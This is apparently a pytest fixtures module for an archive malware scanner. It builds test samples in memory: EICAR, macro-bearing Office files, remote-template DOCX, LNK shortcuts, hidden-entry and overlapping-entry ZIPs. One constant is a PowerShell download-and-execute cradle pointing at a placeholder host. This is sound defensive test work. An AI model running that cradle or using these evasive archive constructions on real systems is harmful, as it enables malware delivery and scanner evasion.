"""Hàm tạo mẫu thử dùng chung. Mọi mẫu được tạo trong bộ nhớ lúc chạy test: repo không chứa mã độc thật."""
import base64
import io
import struct
import tarfile
import zipfile

import pytest

from archive_guard.scanner import Scanner

EICAR = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*").encode()


FAKE_EXE = b"MZ" + b"\0" * 126


PS_DOWNLOADER = b"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a.ps1')"


def make_zip(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in files.items():
            z.writestr(name, data)
    return buf.getvalue()


def scan(data, name="sample.zip", **kw):
    return Scanner(use_clamav=False, **kw).scan_bytes(data, name)


def rules_of(report):
    return {x.rule for f in report.files for x in f.findings}


def set_encrypted_flag(data):
    """zipfile chuẩn không tạo được ZIP có mật khẩu, nên bật cờ 'đã mã hóa' trực tiếp trong header."""
    b = bytearray(data)
    for sig, offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        b[b.find(sig) + offset] |= 1
    return bytes(b)


def make_7z(files, password=None, header_encryption=False):
    py7zr = pytest.importorskip("py7zr")
    buf = io.BytesIO()
    with py7zr.SevenZipFile(buf, "w", password=password, header_encryption=header_encryption) as z:
        for name, data in files.items():
            z.writestr(data, name)
    return buf.getvalue()


def make_pe(sections):
    """PE tối giản: header DOS + PE + bảng section [(tên, dữ liệu, characteristics)]."""
    import struct
    table = 0x40 + 24
    offset = table + 40 * len(sections)
    head = bytearray(b"MZ" + bytes(0x3A) + struct.pack("<I", 0x40) + b"PE\0\0"
                     + struct.pack("<HH", 0x14C, len(sections)) + bytes(12) + struct.pack("<HH", 0, 0))
    body = b""
    for name, data, chars in sections:
        head += name.encode().ljust(8, b"\0") + struct.pack("<IIIIIIHHI", len(data), 0, len(data),
                                                           offset + len(body), 0, 0, 0, 0, chars)
        body += data
    return bytes(head) + body


def scanned_count(report):
    return sum(1 for f in report.files if f.kind != "?")


def tar_gz(files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            if data is None:
                info.type = tarfile.DIRTYPE
            else:
                info.size = len(data)
            t.addfile(info, io.BytesIO(data or b""))
    return buf.getvalue()


# --- Mẫu Office/LNK/ZIP bất thường: dựng từng byte theo đặc tả, nội dung vô hại (địa chỉ .invalid) ---

def ovba_compress(text: bytes) -> bytes:
    """Nén MS-OVBA chỉ bằng literal (hợp lệ theo đặc tả, không cần thuật toán nén thật)."""
    out = bytearray(b"\x01")
    for i in range(0, len(text), 3632):
        part = text[i:i + 3632]
        body = b"".join(b"\x00" + part[j:j + 8] for j in range(0, len(part), 8))
        out += ((len(body) - 1) | 0xB000).to_bytes(2, "little") + body  # chữ ký 0b011 + cờ "đã nén"
    return bytes(out)


def make_vba_ole(source: bytes) -> bytes:
    """vbaProject.bin giả: đầu file OLE + một module VBA đã nén (đủ để bộ dò tìm và giải nén)."""
    return (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + bytes(504) + "_VBA_PROJECT".encode("utf-16-le") + bytes(16)
            + ovba_compress(b'Attribute VB_Name = "ThisDocument"\r\n' + source))


def make_docm(source: bytes) -> bytes:
    return make_zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w:document/>",
                     "word/vbaProject.bin": make_vba_ole(source)})


def make_docx_remote_template(url: str) -> bytes:
    rels = ('<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
            f'relationships/attachedTemplate" Target="{url}" TargetMode="External"/></Relationships>').encode()
    return make_zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w:document/>",
                     "word/_rels/settings.xml.rels": rels})


def make_lnk(relative_path: str, arguments: str) -> bytes:
    """Shell Link tối thiểu (MS-SHLLINK): HasRelativePath | HasArguments | IsUnicode."""
    header = bytearray(76)
    struct.pack_into("<I", header, 0, 0x4C)
    header[4:20] = bytes.fromhex("0114020000000000c000000000000046")  # CLSID 00021401-0000-0000-C000-000000000046
    struct.pack_into("<I", header, 20, 0x08 | 0x20 | 0x80)
    strings = b"".join(struct.pack("<H", len(t)) + t.encode("utf-16-le") for t in (relative_path, arguments))
    return bytes(header) + strings


def ps_encoded(command: str) -> str:
    return base64.b64encode(command.encode("utf-16-le")).decode()


def _zip_parts(z: bytes):
    e = z.rfind(b"PK\x05\x06")
    cd_size, cd_off = struct.unpack_from("<II", z, e + 12)
    return z[:cd_off], z[cd_off:cd_off + cd_size], bytearray(z[e:])


def zip_with_hidden(visible: dict, hidden: dict) -> bytes:
    """ZIP có thêm local header của các file `hidden` nhưng danh mục (central directory) chỉ liệt kê `visible`."""
    local_v, cd_v, eocd = _zip_parts(make_zip(visible))
    local_h, _, _ = _zip_parts(make_zip(hidden))
    struct.pack_into("<I", eocd, 16, len(local_v) + len(local_h))
    return local_v + local_h + cd_v + bytes(eocd)


def zip_with_overlap(name: str, data: bytes) -> bytes:
    """Hai mục trong danh mục trỏ cùng một vùng dữ liệu (cấu trúc của zip bomb không lồng nhau)."""
    local, cd, eocd = _zip_parts(make_zip({name: data}))
    struct.pack_into("<HHII", eocd, 8, 2, 2, len(cd) * 2, len(local))
    return local + cd + cd + bytes(eocd)
